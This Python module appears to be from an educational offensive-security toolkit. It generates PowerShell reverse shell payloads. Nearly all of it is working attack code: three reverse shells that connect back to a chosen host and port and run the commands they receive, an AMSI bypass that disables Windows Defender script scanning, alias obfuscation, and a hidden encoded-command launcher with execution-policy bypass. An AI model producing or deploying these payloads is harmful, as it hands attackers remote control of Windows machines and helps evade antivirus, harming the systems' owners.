"""
PowerShell reverse shell payload generator
"""

import base64
from .base import PayloadGenerator, PayloadConfig, PayloadExplanation
from learnshells.utils.logger import Logger
from typing import Dict


class PowerShellGenerator(PayloadGenerator):
    """Generate PowerShell reverse shell payloads."""
    
    def generate(
        self,
        encode: bool = False,
        obfuscate: bool = False,
        bypass_amsi: bool = True
    ) -> str:
        """
        Generate PowerShell reverse shell payload.
        
        Args:
            encode: Whether to encode
            obfuscate: Whether to obfuscate
            bypass_amsi: Whether to include AMSI bypass
            
        Returns:
            PowerShell payload string
        """
        # Get lhost and lport from config
        lhost = self.config.lhost
        lport = self.config.lport
        
        # Check if logger exists
        if not hasattr(self, 'logger'):
            self.logger = Logger()
        
        # Build payload components
        payload_parts = []
        
        # Add AMSI bypass if requested
        if bypass_amsi:
            payload_parts.append(self._get_amsi_bypass())
        
        # Add main shell payload
        payload_parts.append(self._generate_reverse_shell())
        
        payload = "; ".join(payload_parts)
        
        if obfuscate:
            payload = self._obfuscate(payload)
        
        if encode:
            payload = self._encode_powershell(payload)
        
        self.logger.success(
            f"Generated PowerShell payload ({len(payload)} bytes)",
            explain="PowerShell is the most powerful option for Windows. "
                   "It has full system access and can bypass many security controls."
        )
        
        if bypass_amsi:
            self.logger.info("AMSI bypass included")
        
        return payload
    
    def _generate_reverse_shell(self) -> str:
        """Generate standard PowerShell reverse shell."""
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
        return payload
    
    def _generate_simple_reverse(self) -> str:
        """Generate simple PowerShell one-liner."""
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = f"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""""
        return payload
    
    def _generate_full_reverse(self) -> str:
        """Generate full-featured PowerShell reverse shell script."""
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = f"""function Invoke-PowerShellTcp {{
    param(
        [string]$IPAddress = '{lhost}',
        [int]$Port = {lport}
    )
    
    try {{
        $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $buffer = New-Object System.Byte[] 1024
        $encoding = New-Object System.Text.AsciiEncoding
        
        $writer.WriteLine("PowerShell Reverse Shell")
        $writer.WriteLine("Connected to: $IPAddress`:$Port")
        $writer.WriteLine("")
        $writer.Flush()
        
        while ($true) {{
            $writer.Write("PS $((Get-Location).Path)> ")
            $writer.Flush()
            
            $read = $null
            $command = ""
            
            while ($stream.DataAvailable -or $read -eq $null) {{
                $read = $stream.Read($buffer, 0, $buffer.Length)
                $command += $encoding.GetString($buffer, 0, $read)
            }}
            
            if ($command.Trim() -eq "exit") {{ break }}
            
            try {{
                $output = Invoke-Expression -Command $command 2>&1 | Out-String
                $writer.WriteLine($output)
            }} catch {{
                $error_msg = $_.Exception.Message
                $writer.WriteLine("Error: $error_msg")
            }}
            
            $writer.Flush()
        }}
        
        $writer.Close()
        $stream.Close()
        $client.Close()
    }} catch {{
        Write-Error $_.Exception.Message
    }}
}}

Invoke-PowerShellTcp -IPAddress '{lhost}' -Port {lport}"""
        return payload
    
    def _get_amsi_bypass(self) -> str:
        """Get AMSI bypass code."""
        bypass = """[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"""
        return bypass
    
    def _obfuscate(self, payload: str) -> str:
        """Obfuscate PowerShell payload."""
        obfuscated = payload
        
        # Replace common cmdlets with aliases
        replacements = {
            'Invoke-Expression': 'iex',
            'Get-Content': 'gc',
            'Set-Content': 'sc',
            'Write-Output': 'echo',
            'ForEach-Object': '%',
            'Where-Object': '?',
        }
        
        for old, new in replacements.items():
            obfuscated = obfuscated.replace(old, new)
        
        return obfuscated
    
    def _encode_powershell(self, payload: str) -> str:
        """Encode PowerShell payload in base64 UTF-16LE for execution."""
        encoded_bytes = payload.encode('utf-16le')
        b64_payload = base64.b64encode(encoded_bytes).decode()
        
        return f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64_payload}"
    
    def test_requirements(self, target_info: Dict) -> bool:
        """
        Test if target meets requirements for PowerShell payload.
        
        Args:
            target_info: Target information dictionary
            
        Returns:
            True if requirements met
        """
        # Check if Windows/PowerShell is detected
        os_type = target_info.get('os', '').lower()
        if 'windows' in os_type or 'win' in os_type:
            return True
        
        # Check web server for Windows/IIS hints
        web_server = target_info.get('web_server', '').lower()
        if 'iis' in web_server or 'microsoft' in web_server:
            return True
        
        return False
    
    def explain(self, payload: str) -> str:
        """
        Explain PowerShell payload.
        
        Args:
            payload: PowerShell payload
            
        Returns:
            Educational explanation
        """
        explanation = """
🎓 POWERSHELL REVERSE SHELL EXPLAINED:

The PowerShell reverse shell creates a TCP connection back to your listener
and executes commands you send through that connection.

Key Components:
• TCPClient: Establishes network connection
• Stream: Handles data transmission
• Byte Buffer: Stores incoming commands
• Command Loop: Continuously reads and executes commands
• AMSI Bypass: Disables Windows Defender script scanning

This is extremely effective on Windows systems as PowerShell is pre-installed
and has full system access through the .NET Framework.
"""
        return explanation
